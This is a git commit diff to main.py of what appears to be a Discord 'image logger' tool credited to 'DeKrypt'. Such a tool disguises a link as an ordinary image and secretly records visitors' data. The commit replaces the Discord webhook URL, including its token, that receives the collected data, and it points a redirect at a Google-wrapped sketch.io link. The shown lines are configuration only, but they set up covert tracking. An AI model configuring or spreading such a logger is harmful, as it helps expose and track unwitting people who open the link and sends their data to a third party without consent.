adc42933dd5e8f44628209da243f02f2c2f43f98
cypruskennard18-create <cypruskennard18@gmail.com>
2025-12-09 18:52:55 +1000

    Update main.py

--- main.py
+++ main.py
@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1091220366984224788/Te54hSoJ1kqvAWLompNzA3aWux7gaiQ9IMgedx76z4grFYQd2dcefXbxnl5tbE4DOVbq",
+    "webhook": "https://discord.com/api/webhooks/1447871639323938901/UX7DORiTlVobxUkHfKP9hKKnxUYVPgg2FceMgQ04Lm5H4ZdJDD9MNId0LE_jQcv6ox-A",
     "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
@@ -51,7 +51,7 @@ config = {
     # REDIRECTION #
     "redirect": {
         "redirect": False, # Redirect to a webpage?
-        "page": "https://your-link.here" # Link to the webpage to redirect to 
+        "page": "https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://sketch.io/sketchpad/&ved=2ahUKEwiSoNG_kLCRAxVZ2TQHHd2hH2IQFnoECBgQAQ&usg=AOvVaw0CG5ixLqrHo_aGPyo2tjdM" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
